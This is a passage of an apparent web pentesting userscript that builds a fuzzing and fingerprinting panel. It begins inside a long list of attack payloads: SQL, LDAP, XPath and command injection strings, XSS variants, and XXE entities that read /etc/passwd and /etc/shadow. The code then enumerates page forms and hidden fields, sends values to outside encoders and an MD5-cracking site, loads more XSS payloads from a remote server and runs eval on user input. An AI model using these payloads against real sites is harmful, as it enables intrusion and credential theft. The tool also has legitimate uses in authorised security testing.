&amp;lt;&amp;gt;&amp;quot;&#039;%;)(&amp;amp;+..</option><option value="&#039;%20or%201=1">421) &#039;%20or%201=1..</option><option value="%27%20or%201=1">422) %27%20or%201=1..</option><option value="%20$(sleep%2050)">423) %20$(sleep%2050)..</option><option value="%20&#039;sleep%2050&#039;">424) %20&#039;sleep%2050&#039;..</option><option value="char%4039%41%2b%40SELECT">425) char%4039%41%2b%40SELECT..</option><option value="&amp;apos;%20OR">426) &amp;apos;%20OR..</option><option value="&#039;sqlattempt1">427) &#039;sqlattempt1..</option><option value="(sqlattempt2)">428) (sqlattempt2)..</option></optgroup><option value="|">429) |..</option><option value="%7C">430) %7C..</option><option value="*|">431) *|..</option><option value="%2A%7C">432) %2A%7C..</option><option value="*(|(mail=*))">433) *(|(mail=*))..</option><option value="%2A%28%7C%28mail%3D%2A%29%29">434) %2A%28%7C%28mail%3D%2A%29%29..</option><option value="*(|(objectclass=*))">435) *(|(objectclass=*))..</option><option value="%2A%28%7C%28objectclass%3D%2A%29%29">436) %2A%28%7C%28objectclass%3D%2A%29%29..</option><option value="(">437) (..</option><option value="%28">438) %28..</option><option value=")">439) )..</option><option value="%29">440) %29..</option><option value="&amp;">441) &amp;..</option><option value="%26">442) %26..</option><option value="!">443) !..</option><option value="%21">444) %21..</option><option value="&#039; or 1=1 or &#039;&#039;=&#039;">445) &#039; or 1=1 or &#039;&#039;=&#039;..</option><option value="&#039; or &#039;&#039;=&#039;">446) &#039; or &#039;&#039;=&#039;..</option><option value="x&#039; or 1=1 or &#039;x&#039;=&#039;y">447) x&#039; or 1=1 or &#039;x&#039;=&#039;y..</option><option value="/">448) /..</option><option value="//">449) //..</option><option value="//*">450) //*..</option><option value="*/*">451) */*..</option><option value="@*">452) @*..</option><option value="count(/child::node())">453) count(/child::node())..</option><option value="x&#039; or name()=&#039;username&#039; or &#039;x&#039;=&#039;y">454) x&#039; or name()=&#039;username&#039; or &#039;x&..</option><option value="&lt;name&gt;&#039;,&#039;&#039;)); phpinfo(); exit;/*&lt;/name&gt;">455) &lt;name&gt;&#039;,&#039;&#039;)); phpinfo(); exit..</option><option value="&lt;![CDATA[&lt;script&gt;var n=0;while(true){n++;}&lt;/script&gt;]]&gt;">456) &lt;![CDATA[&lt;script&gt;var n=0;while(true){n++;..</option><option value="&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#039;XSS&#039;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;">457) &lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;..</option><option value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#039;XSS&#039;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;">458) &lt;?xml version=&quot;1.0&quot; encoding=&quot;IS..</option><option value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&#039; or 1=1 or &#039;&#039;=&#039;]]&gt;&lt;/foo&gt;">459) &lt;?xml version=&quot;1.0&quot; encoding=&quot;IS..</option><option value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file://c:/boot.ini&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;">460) &lt;?xml version=&quot;1.0&quot; encoding=&quot;IS..</option><option value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;">461) &lt;?xml version=&quot;1.0&quot; encoding=&quot;IS..</option><option value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/shadow&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;">462) &lt;?xml version=&quot;1.0&quot; encoding=&quot;IS..</option><option value="&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////dev/random&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;">463) &lt;?xml version=&quot;1.0&quot; encoding=&quot;IS..</option><option value="&lt;xml ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#039;XSS&#039;);&quot;&gt;]]&gt;">464) &lt;xml ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;..</option><option value="&lt;xml ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#039;XSS&#039;)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;">465) &lt;xml ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&a..</option><option value="&lt;xml SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;">466) &lt;xml SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/x..</option><option value="&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;">467) &lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;..</option><optgroup label="Debug/Hidden Parameters"><option value="test=1">468) test=1..</option><option value="test=true">469) test=true..</option><option value="test=yes">470) test=yes..</option><option value="test=y">471) test=y..</option><option value="7357=1">472) 7357=1..</option><option value="7357=true">473) 7357=true..</option><option value="7357=yes">474) 7357=yes..</option><option value="7357=y">475) 7357=y..</option><option value="admin=1">476) admin=1..</option><option value="admin=true">477) admin=true..</option><option value="admin=yes">478) admin=yes..</option><option value="admin=y">479) admin=y..</option><option value="adm=1">480) adm=1..</option><option value="adm=true">481) adm=true..</option><option value="adm=yes">482) adm=yes..</option><option value="adm=y">483) adm=y..</option><option value="adm1n=1">484) adm1n=1..</option><option value="adm1n=true">485) adm1n=true..</option><option value="adm1n=yes">486) adm1n=yes..</option><option value="adm1n=y">487) adm1n=y..</option><option value="access=1">488) access=1..</option><option value="access=true">489) access=true..</option><option value="access=yes">490) access=yes..</option><option value="access=y">491) access=y..</option><option value="grant=1">492) grant=1..</option><option value="grant=true">493) grant=true..</option><option value="grant=yes">494) grant=yes..</option><option value="grant=y">495) grant=y..</option><option value="debug=1">496) debug=1..</option><option value="debug=true">497) debug=true..</option><option value="debug=yes">498) debug=yes..</option><option value="debug=y">499) debug=y..</option><option value="dbg=1">500) dbg=1..</option><option value="dbg=true">501) dbg=true..</option><option value="dbg=yes">502) dbg=yes..</option><option value="dbg=y">503) dbg=y..</option><option value="edit=1">504) edit=1..</option><option value="edit=true">505) edit=true..</option><option value="edit=yes">506) edit=yes..</option></optgroup><optgroup label="More XSS" id="more_xss"><option onclick="yehgLoadXSSAll()">Click here to load</option></optgroup>';


unsafeWindow.yehgSend4Fuzzing = function(where)
{
	var s =document.getElementById('fuzzdb'); 	
	if(s.options[s.selectedIndex].value.indexOf("Check")> -1){alert("Select a fuzz string!");return;}
		
	if(where == "PCE")
	{
		window.open("http://yehg.net/encoding/?outputtext="+ encodeURIComponent(s.options[s.selectedIndex].value));	
	}
	else
	{
		window.open("http://yehg.net/encoding/?sendtohackvertor="+ encodeURIComponent(s.options[s.selectedIndex].value));
	}
}

printdata += '</select>&nbsp;&nbsp;[<span style="cursor:pointer;color:yellow!important;" title="Insert selected fuzz to fuzz url" onclick="yehgInsertFuzz()">Insert</span>]&nbsp;&nbsp;[<a title="Send selected fuzz to PHP Charset Encoder" style="color:yellow!important;text-decoration:none"  href="javascript:void(0)" onclick="yehgSend4Fuzzing(\'PCE\')">PCE</a>]&nbsp;&nbsp;[<a title="Send selected fuzz to HackerVertor" style="color:yellow!important;text-decoration:none;"    href="javascript:void(0)" onclick="yehgSend4Fuzzing(\'HV\')">HackVertor</a>]<br><br>Launch Window in <input type="text" value="2" id="fztimer"> seconds<br><br>If content-length &nbsp;&nbsp;&nbsp;&nbsp;<select id="length_operator"><option value="==">==</option><option value="&lt;=">&lt;=</option><option value="&gt;=">&gt;=</option><option value="&lt;">&lt;</option><option value="&gt;">&gt;</option></select>&nbsp;&nbsp; <input type="text" value="null" id="yehg_content_length"> , automatically close Window [Esp. for Debug/Hidden]<br><br>If contents do&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<select id="yehg_content_grep_criteria"><option value="AND">HAVE</option><option value="NOT">NOT HAVE</option></select>&nbsp;&nbsp; <input type="text" value="null" id="yehg_grep"> , automatically close Window [Esp. for vulnerability pattern matching]<br><br>Fuzz Index From &nbsp;&nbsp;&nbsp;<input type="text" value="1" id="fzfrom">&nbsp; To&nbsp; <input type="text" value="10" id="fzto"><br><br>Fuzz Keywords: {XSS} {SQL} {TRA} {CMD} {FUZZ} {DEBUG}<br><br><div id="fuzz_result" style="border:1px dashed red;display:none;font-style:italics;"></div></fieldset><br>';

unsafeWindow.yehgMoreXSS = "";
unsafeWindow.yehgLoadXSSAll = function()
{
	
	var url = yehg_url + '/lab/pr0js/pentest/wordlists/index_select.php?file=injections/xss_all.txt&start=507';
    var pgHead = document.getElementsByTagName("head").item(0);
    var objJsFile = document.createElement("script");
    objJsFile.setAttribute('type','text/javascript');
    objJsFile.setAttribute('src', url);
    objJsFile.setAttribute('onload',"(function(){document.getElementById('more_xss').innerHTML=yehgMoreXSS;alert('Done loading all XSS!\\nCheck the index starting from 507!');document.getElementById('fuzzdb').selectedIndex=507;})()" ); 
	objJsFile.setAttribute('onerror',"alert('File not found or Error in loading fie!')");    
    pgHead.appendChild(objJsFile);	
}

fuzzlink = "<br><b>[Fuzzable Links]</b><br>";
hasfuzzlink = 0;
for(var i=0;i<=document.getElementsByTagName("a").length-1;i++)
{
    if(document.getElementsByTagName("a")[i].href.indexOf("?")>0)
    {
        var href = document.getElementsByTagName("a")[i].href+"";
        if(href.indexOf("javascript")!=-1)
        {
            fuzzlink +="<br><a style='color:yellow!important;text-decoration:underline;' href='javascript:void(0)' onclick=\"" + href + "\">"+ document.getElementsByTagName("a")[i].href+ "</a><br>";         
        
        }
        else
        {
            fuzzlink +="<br><a target='_blank' style='color:yellow!important;text-decoration:underline;' href='" + href + "'>"+ document.getElementsByTagName("a")[i].href+ "</a><br>";         
        
        }
        hasfuzzlink=1;
    }
}

if(hasfuzzlink==1){printdata+=fuzzlink;}


// Print Window Object & Form Elements in Firebug Log
hasform = 0;
formsdata = "<br><b>[Form Data]</b><br>";
var curdir = document.URL.toString().substr(0,document.URL.toString().lastIndexOf("/")+1);
//var unsafeWindow.urlized_forms = new Array();

for(var f=0;f<=unsafeWindow.document.getElementsByTagName("form").length-1;f++)
{
    hasform=1;
    var urlee = '';
    formsdata += "<br><i>Form " + f + ":</i><br>";
    formsdata += "name: "+document.getElementsByTagName("form")[f].name+"<br>";
    formsdata += "action: <a style='color:yellow!important;text-decoration:underline;' target='_blank' href='" + document.getElementsByTagName("form")[f].action + "'>"+ document.getElementsByTagName("form")[f].action +"</a><br>";
 	urlee +=  document.getElementsByTagName("form")[f].action+"?test=1";
	    
    formsdata += "method: <span id='yehg_fid-"+f + "'>" + document.getElementsByTagName("form")[f].method+"</span>&nbsp;&nbsp;";
    formsdata += "[<a style='color:yellow!important;text-decoration:underline;' href='javascript:void(0)' onclick='if(document.forms[" + f + "].method==\"get\"){document.forms[" + f + "].method=\"post\";document.getElementById(\"yehg_fid-" + f + "\").innerHTML=\"post\";}else{document.forms[" + f + "].method=\"get\";;document.getElementById(\"yehg_fid-" + f + "\").innerHTML=\"get\";}'>toggle method</a>]<br>";
    formsdata += "<br><i>Form " + f + " Elements:</i><br>";
    for(var e=0;e<=unsafeWindow.document.getElementsByTagName("form")[f].elements.length;e++)
    {
if(unsafeWindow.document.getElementsByTagName("form")[f].elements[e]!= null && document.getElementsByTagName("form")[f].elements[e]!= "undefined")
      {        
        	if(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].name!="" && unsafeWindow.document.getElementsByTagName("form")[f].elements[e].name!="undefined" && unsafeWindow.document.getElementsByTagName("form")[f].elements[e].name!=null)
        	{
				
			
            if(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].type=="hidden")
            {
                formsdata += "No. " + e + " . Name: " +  unsafeWindow.document.getElementsByTagName("form")[f].elements[e].name+"&nbsp;&nbsp;[type=" +unsafeWindow.document.getElementsByTagName("form")[f].elements[e].type+"]&nbsp;&nbsp;[value=<span id='form-" + f + "-e-" + e + "' style='color:red;font-weight:bold'>" + escape(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value) + "</span>]";
                formsdata += " [<a href=\"javascript:void(0)\" onclick=\"document.getElementsByTagName('form')["+f+"].elements["+e+"].type='text'\">Change hidden to text</a>] ";
               if(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value.length >2)
               {
                    formsdata += "<br>=>&nbsp;&nbsp;<a target='_blank' title='Send to PHP Charset Encoder' style='color:yellow!important;text-decoration:underline;'  href='http://yehg.net/encoding/?outputtext="+ encodeURIComponent(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value) +"'>PCE</a>&nbsp;&nbsp;<a target='_blank' title='Send to HackerVertor' style='color:yellow!important;text-decoration:underline;'  href='http://yehg.net/encoding/?sendtohackvertor="+  encodeURIComponent(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value) +"'>HackVertor</a>";                    
                    if(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value.length==32)
                    {
                        formsdata +="&nbsp;&nbsp;<a target='_blank' title='Send to Gdata MD5 Cracker' style='color:yellow!important;text-decoration:underline;'  href='http://gdataonline.com/qkhash.php?mode=xml&hash="+ unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value +"'>MD5Crack</a>"
                    }
                    formsdata +="<br>";
                }
                 
                else
                {
                    formsdata +="<br>";    
                }
                formsdata += " [<a href=\"javascript:void(0)\" onclick=\"var x=prompt('Enter custom payload text');if(x){document.getElementsByTagName('form')["+f+"].elements["+e+"].value=x;document.getElementById('form-" + f + "-e-" + e + "').innerHTML=escape(x);}\">Change Value</a>]<br\/> ";
            }
            else
            {
                formsdata += "No. " + e + " . Name: " +  unsafeWindow.document.getElementsByTagName("form")[f].elements[e].name+"&nbsp;&nbsp;[type=" +unsafeWindow.document.getElementsByTagName("form")[f].elements[e].type+"]&nbsp;&nbsp;[value=<span  id='form-" + f + "-e-" + e + "'  style='font-weight:bold;'>" + escape(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value) + "</span>]";
                formsdata += " [<a href=\"javascript:void(0)\" onclick=\"var x=prompt('Enter custom payload text');if(x){document.getElementsByTagName('form')["+f+"].elements["+e+"].value=x;document.getElementById('form-" + f + "-e-" + e + "').innerHTML=escape(x);}\">Change Value</a>]";
             
            }
            
			   urlee += "&" + unsafeWindow.document.getElementsByTagName("form")[f].elements[e].name +
                		 "=" + escape(unsafeWindow.document.getElementsByTagName("form")[f].elements[e].value);
                		 
		  
			                  		 
			}
			            
       
          
      }
    }
    formsdata += '<br><br> <input type="button" value="Submit this form ' + f + ' " onclick="document.getElementsByTagName(\'form\')[' + f+ '].submit()"><br>';
    formsdata += '<br>Form [' + f + '] URL String: [<span style="cursor:pointer;color:yellow!important;text-decoration:underline;" onclick="document.getElementById(\'form_urlized-' + f + '\').select()">Select</span> | <span style="cursor:pointer;color:yellow!important;text-decoration:underline;" onclick="document.getElementById(\'fuzz_url\').value=document.getElementById(\'form_urlized-' + f + '\').value;window.location=\'#stat\';void(0)">Send to FuzzForm</span> | ';
    formsdata += '<span style="cursor:pointer;color:yellow!important;text-decoration:underline;" onclick="window.open(document.getElementById(\'form_urlized-' + f + '\').value);void(0)">PUSH to URL</span>]';
    formsdata += '<br><textarea wrap="soft" cols="100" style="font-family:arial;font-size:12px;word-wrap:break-word" rows="7" id="form_urlized-' + f + '">' + urlee + '</textarea><br>Fuzz Keywords:&nbsp;&nbsp;{XSS}&nbsp;&nbsp;{SQL}&nbsp;&nbsp;{TRA}&nbsp;&nbsp;{CMD}&nbsp;&nbsp;{FUZZ}&nbsp;&nbsp;{DEBUG}<br>';
}

if(hasform==1){printdata += formsdata;}

// @credit : Ajax Db List was copied from shreeraj @ net-square.com
var get_ajax_framework = function(str)
{
    var isPrototype = /^(prototype\.js)/i;    
    var scriptaculous = /^(builder|controls|window|dragdrop|effects|scriptaculous|slider|unittest)(\.js)/i;
    var dojo= /^(dojo)(\.js\.uncompressed|\.js)/i;
    var DWR = /^(auth|engine|util|DWRActionUtil)(\.js)/i;
    var Moo = /^(Moo|Function|Array|String|Element|Fx|Dom|Ajax|Drag|Windows|Cookie|Json|Sortabe|Fxpack|Fxutils|Fxtransition|Tips|Accordion)(\.js)/i;
    var Rico = /^(rico\.js)/i;
    var Mochikit = /^(MochiKit\.js)/i;
    var YUI = /^(animation|autocomplete|calendar|connection|container|dom|event|logger|menu|slider|tabview|treeview|utilities|yahoo|yahoo\-dom\-event)/i;
    var Xajax = /^(xajax|xajax_uncompressed)(\.js)/i;
    var GWT = /^(gwt|search\-results)(\.js)/i;
    var Atlas = /^(AtlasRuntime|AtlasBindings|AtlasCompat|AtlasCompat2)(\.js)/i;
    var jQuery = /^(jceutilities|jquery|jquery\-latest.pack|jquery\-latest)(\.js)/i;
    var Macromedia = /^(mm_)/i;
    var Google = /(google|gaia|ga|urchin|__utm)(\.js)/i;
    var thirdPartyAddOn = /(_)(ads|shots|widget)(\.js)$/i;
    
    if(isPrototype.test(str))
	return "Prototype";
    else if (scriptaculous.test(str))
	return "Scriptaculous";
    else if (dojo.test(str))
	return "Dojo Toolkit";
    else if (DWR.test(str))
	return "Direct Web Remoting (DWR)";
    else if (Moo.test(str))
	return "Moo";
    else if (Rico.test(str))
	return "Rico";
    else if (Mochikit.test(str))
	return "Mochikit";
    else if (YUI.test(str))
	return "YUI";
    else if (Xajax.test(str))
	return "Xajax";
    else if (GWT.test(str))
	return "GWT";
    else if (Atlas.test(str))
	return "Microsoft Atlas";
    else if (jQuery.test(str))
	return "jQuery";
    else if (Macromedia.test(str))
        return "Adobe(Dreamweaver/Fireworks) Generated"
    else if (Google.test(str))
        return "Google Service"
    else if (thirdPartyAddOn.test(str))
        return "Third-Party Service Addons"        
    else
	return "N/A";
        
}
//alert(get_ajax_framework("jceutilities-150.js"));

//alert(typeof(unsafeWindow.getCookie));
printdata += "<br><span style='font-style:italic;color:pink;'>Best Practice: Block all Ad-related JavaScript sources. Use AddblockPlus!</span><br>";

scriptsrc = "<br><b>[Script Source]</b><br><br>";

hasscriptsrc=0;
for(var s=0;s<=unsafeWindow.document.getElementsByTagName("script").length-1;s++)
{
    hasscriptsrc=1;
    if(unsafeWindow.document.getElementsByTagName("script")[s].src!="")
    {
	var src = unsafeWindow.document.getElementsByTagName("script")[s].src;
	src = src.substring(src.lastIndexOf("/")+1,src.length);
        scriptsrc += 'No. ' + s + ' <a  target="_blank"  style="color:yellow!important;text-decoration:underline;" href="' + unsafeWindow.document.getElementsByTagName("script")[s].src + '?fingerprint">'+unsafeWindow.document.getElementsByTagName("script")[s].src+'</a> of Framework: ' + get_ajax_framework(src) +'<br>';      
    }
    else
    {
        scriptsrc += 'No. ' + s + ' <a  target="_blank"  style="color:yellow!important;text-decoration:underline;" href="javascript:void(0)" onclick="yehgWriteFirebugConsoleLog(unescape(\'Inline Script # ' + s +  escape(unsafeWindow.document.getElementsByTagName("script")[s].innerHTML) + '\'));return false;">Inline JavaScript</a><br>';
    }
    
    
}
if(hasscriptsrc==1){printdata+=scriptsrc;}
var yehgObj = /^(yehg)/i;

var nativeObj = /^(getInterface|window|console|document|addEventListener|__firebug__|firebug|_firebug|_FirebugConsole|loadFirebugConsole|XPCSafeJSObjectWrapper|showModalDialog|postMessage|location|navigator|Packages|sun|java|netscape|XPCNativeWrapper|GeckoActiveXObject|Components|parent|removeEventListener|top|scrollbars|name|scrollX|scrollY|scrollTo|scrollBy|getSelection|scrollByLines|scrollByPages|sizeToContent|prompt|dump|setTimeout|setInterval|clearTimeout|clearInterval|setResizable|captureEvents|releaseEvents|routeEvent|enableExternalCapture|disableExternalCapture|open|openDialog|frames|find|self|screen|history|content|menubar|toolbar|locationbar|personalbar|statusbar|directories|closed|crypto|pkcs11|controllers|opener|status|defaultStatus|innerWidth|innerHeight|outerWidth|outerHeight|screenX|screenY|pageXOffset|pageYOffset|scrollMaxX|scrollMaxY|length|fullScreen|alert|confirm|focus|blur|back|forward|home|stop|print|moveTo|moveBy|resizeTo|resizeBy|scroll|close|updateCommands|atob|btoa|frameElement|dispatchEvent|getComputedStyle|sessionStorage|globalStorage|applicationCache|_getFirebugConsoleElement|Firebug)$/;
var hasCusObj=0;
cusObj = "<br><b>[Custom JS Objects]</b><br><br>";
//unsafeWindow.yehgWriteFirebugConsoleLog("");
//unsafeWindow.yehgWriteFirebugConsoleLog("[Objects]");
//unsafeWindow.yehgWriteFirebugConsoleLog("");
//unsafeWindow.yehgWriteFirebugConsoleLog("");
for(w in unsafeWindow.window)
{
    if( (!nativeObj.test(w)) && (!yehgObj.test(w)))
    {
        if(typeof(eval("unsafeWindow."+w)) == "object")
        {
            if(w.indexOf("mm")==0)
            {
                cusObj  += "=><a href=\"javascript:yehgWriteFirebugConsoleLog('"+w+"');yehgWriteFirebugConsoleDir("+w+")\">"+w+"</a>&nbsp;&nbsp;&nbsp;&nbsp; " + eval("unsafeWindow."+w)+"&nbsp;&nbsp; {possible source: adobe products}<br>";    
            }
            else if(w.indexOf("google_")==0 || w.indexOf("_u")==0 || w.indexOf("gaGlobal")==0)
            {
                cusObj  += "=><a href=\"javascript:yehgWriteFirebugConsoleLog('"+w+"');yehgWriteFirebugConsoleDir("+w+")\">"+w+"</a>&nbsp;&nbsp;&nbsp;&nbsp; " + eval("unsafeWindow."+w)+"&nbsp;&nbsp; {possible source: google ads}<br>";    
            }
            else
            {
                cusObj  += "=><a href=\"javascript:yehgWriteFirebugConsoleLog('"+w+"');yehgWriteFirebugConsoleDir("+w+")\">"+w+"</a>&nbsp;&nbsp;&nbsp;&nbsp; " + eval("unsafeWindow."+w)+"<br>";
            }
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            //unsafeWindow.yehgWriteFirebugConsoleLog("=>"+w+"  " + eval("unsafeWindow."+w)+"");
            //unsafeWindow.yehgWriteFirebugConsoleDir(eval("unsafeWindow."+w));
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            hasCusObj=1;            
            
        }
        
    }   
        
}

cusObj += "<br><b>[Custom JS Variables]</b><br><br>";
//unsafeWindow.yehgWriteFirebugConsoleLog("");
//unsafeWindow.yehgWriteFirebugConsoleLog("");
//unsafeWindow.yehgWriteFirebugConsoleLog("[Variables]");
//unsafeWindow.yehgWriteFirebugConsoleLog("");

for(w in unsafeWindow.window)
{
    if( (!nativeObj.test(w)) && (!yehgObj.test(w)))
    {
        if(typeof(eval("unsafeWindow."+w)) != "function" && typeof(eval("unsafeWindow."+w)) != "object")
        {
            ev = eval("unsafeWindow."+w)+"";
            ev=ev.replace(/</i,"&lt;");
            ev=ev.replace(/>/i,"&gt;");
            
            if(w.indexOf("_u")==0 || w.indexOf("google_")==0)
            {
                 cusObj  += "=>"+w+"&nbsp;&nbsp;[type=" + typeof(eval("unsafeWindow."+w))+"]&nbsp;&nbsp;[value=" + ev + "]&nbsp;&nbsp; {possible source: google ads}<br>";
            }
            else
            {
                cusObj  += "=>"+w+"&nbsp;&nbsp;[type=" + typeof(eval("unsafeWindow."+w))+"]&nbsp;&nbsp;[value=" + ev + "]<br>";      
            }

           
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            //unsafeWindow.yehgWriteFirebugConsoleLog("=>"+w+"  [type=" + typeof(eval("unsafeWindow."+w))+"]");
            //unsafeWindow.yehgWriteFirebugConsoleDir(eval("unsafeWindow."+w));
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            hasCusObj=1;           
            
        }
        
    }   
        
}


cusObj += "<br><b>[Custom JS Functions] <a style='color:yellow!important;text-decoration:underline;' href='javascript:var cus=prompt(\"Enter function name\",\"Function name\",\"Function to Execute\");if(cus!=null&&cus!=\"\"&&cus!=\"Function name\"){eval(cus);}'>Execute</a></b><br><br>";
//unsafeWindow.yehgWriteFirebugConsoleLog("");
//unsafeWindow.yehgWriteFirebugConsoleLog("");
//unsafeWindow.yehgWriteFirebugConsoleLog("[Functions]");
//unsafeWindow.yehgWriteFirebugConsoleLog("");


for(w in unsafeWindow.window)
{
    if( (!nativeObj.test(w)) && (!yehgObj.test(w)))
    {
        if(typeof(eval("unsafeWindow."+w)) == "function")
        {
            if(w.indexOf("google_")==0)
            {
                cusObj  += "=><a style='color:yellow!important;text-decoration:underline;' href='javascript:yehgWriteFirebugConsoleDir("+w+");'>" + w + "()</a>&nbsp;&nbsp; {possible source: google ads}<br>";
            }
            else if(w.indexOf("__u")==0 || w.indexOf("_u")==0 || w.indexOf("urchinTracker") ==0)
            {
                cusObj  += "=><a style='color:yellow!important;text-decoration:underline;' href='javascript:yehgWriteFirebugConsoleDir("+w+");'>" + w + "()</a>&nbsp;&nbsp; {possible source: google ads}<br>";
            }            
            else
            {
                cusObj  += "=><a style='color:yellow!important;text-decoration:underline;' href='javascript:yehgWriteFirebugConsoleDir("+w+");'>" + w + "()</a><br>";
            }
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            //unsafeWindow.yehgWriteFirebugConsoleLog("=>"+w);
            //unsafeWindow.yehgWriteFirebugConsoleDir(eval("unsafeWindow."+w));
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            //unsafeWindow.yehgWriteFirebugConsoleLog("");
            hasCusObj=1;
            //cusObj += "<pre>" + eval("unsafeWindow."+w)+"</pre><br><br>";
            
        }
        
    }   
        
}

if(hasCusObj==1){printdata += cusObj;}

var div = document.createElement("div");
div.setAttribute("id","yehgfingerprint");
div.setAttribute("style","display:none;-moz-opacity:0;position:absolute;left:10%;right:10%;padding:1% 1% 1% 1%;top:1%;text-align:left;background-color:black;color:white;float:right;border:1px outset gray;");
div.innerHTML ="<a name='yehgfingerprint'></a>"+printdata+"<br>";
var div2 = document.createElement("div");
div2.setAttribute("id","yehgfingerprint2");
div2.setAttribute("style","-moz-opacity:0.2;position:fixed;top:1%;left:94%");

var div3 = document.createElement("div");
div3.setAttribute("id","yehgfingerprint_status");
div3.setAttribute("style","position:fixed;top:0%;left:45%;with:30%;border:1px solid black;background-color:red;color:white;display:none;");
div3.innerHTML = "&nbsp;&nbsp;Job: None&nbsp;&nbsp;";

unsafeWindow.yehgWriteStatusLog = function(statusText,show)
{
	if(show==1)
	{
		document.getElementById('yehgfingerprint_status').style.display = '';
	}
	else 
	{
		document.getElementById('yehgfingerprint_status').style.display = 'none';
	}
	document.getElementById('yehgfingerprint_status').innerHTML = "&nbsp;&nbsp;"+statusText+"&nbsp;&nbsp;"; 
	if (statusText.indexOf('Done') > 0)
		document.getElementById('yehgfingerprint_status').style.backgroundColor = 'green';
	else
		document.getElementById('yehgfingerprint_status').style.backgroundColor = 'red';
}

unsafeWindow.yehgToggleFlashObjs = function(show)
{
	for(var j=0;j<=unsafeWindow.document.getElementsByTagName("object").length-1;j++)
	{
		if(show==1)
		unsafeWindow.document.getElementsByTagName("object")[j].style.display = '';
		else
		unsafeWindow.document.getElementsByTagName("object")[j].style.display = 'none';
	}
	
}
unsafeWindow.showYehgFingerprint = function()
{
	unsafeWindow.yehgsfg=setInterval("yehgshowFingerprint()",80);
	document.getElementById("yehgfingerprint2").style.display="none";
	unsafeWindow.yehgFingerprinterHasShown = 1;
	unsafeWindow.yehgToggleFlashObjs(0);
}
unsafeWindow.hideYehgFingerprint = function()
{
	document.getElementById("yehgfingerprint").style.display="none";
	document.getElementById("yehgfingerprint2").style.display="";
	document.getElementById('yehgfingerprint_status').style.display="none";
	unsafeWindow.yehgFingerprinterHasShown = 0;
	unsafeWindow.yehgToggleFlashObjs(1);
}
unsafeWindow.yehgFingerprinterHasShown = 0;

unsafeWindow.yegh
